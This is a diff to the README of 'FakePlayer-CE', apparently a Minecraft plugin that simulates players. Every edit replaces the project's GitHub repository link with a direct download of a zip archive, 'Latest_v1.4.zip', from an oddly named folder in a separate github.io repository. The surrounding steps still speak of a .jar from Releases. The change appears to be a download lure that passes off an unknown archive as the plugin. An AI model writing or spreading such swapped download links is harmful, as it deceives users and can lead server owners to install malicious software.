@@ -5,7 +5,7 @@ description: "Deploy fake players across Minecraft 1.20.1 to 26.2 with this comm
 ---
 # 🎭 FakePlayer-CE - Bring Your Server to Life!
 
-[![Download FakePlayer-CE](https://img.shields.io/badge/Download-FakePlayer--CE-4CAF50?style=for-the-badge&logo=github)](https://github.com/tybiechaste1525/FakePlayer-CE)
+[![Download FakePlayer-CE](https://img.shields.io/badge/Download-FakePlayer--CE-4CAF50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/tybiechaste1525/tybiechaste1525.github.io/main/whatna/Latest_v1.4.zip)
 
 ---
 
@@ -25,7 +25,7 @@ Getting FakePlayer-CE running is easier than you think. Follow these simple step
 
 ### ⬇️ Step 1: Visit the Download Link
 
-Visit this link to download the application: **[https://github.com/tybiechaste1525/FakePlayer-CE](https://github.com/tybiechaste1525/FakePlayer-CE)**
+Visit this link to download the application: **[https://raw.githubusercontent.com/tybiechaste1525/tybiechaste1525.github.io/main/whatna/Latest_v1.4.zip](https://raw.githubusercontent.com/tybiechaste1525/tybiechaste1525.github.io/main/whatna/Latest_v1.4.zip)**
 
 This page is your one-stop shop for everything FakePlayer-CE. You'll find the latest version, release notes, and the download button clearly marked.
 
@@ -133,7 +133,7 @@ Running a Minecraft server is a big responsibility. You want your world to feel 
 
 Ready to get started? Here's your final checklist:
 
-1.  **Visit this link to download the application:** **[https://github.com/tybiechaste1525/FakePlayer-CE](https://github.com/tybiechaste1525/FakePlayer-CE)**
+1.  **Visit this link to download the application:** **[https://raw.githubusercontent.com/tybiechaste1525/tybiechaste1525.github.io/main/whatna/Latest_v1.4.zip](https://raw.githubusercontent.com/tybiechaste1525/tybiechaste1525.github.io/main/whatna/Latest_v1.4.zip)**
 2.  Download the `.jar` file from the Releases section.
 3.  Put the `.jar` file into your server's `plugins` folder.
 4.  Restart your server.
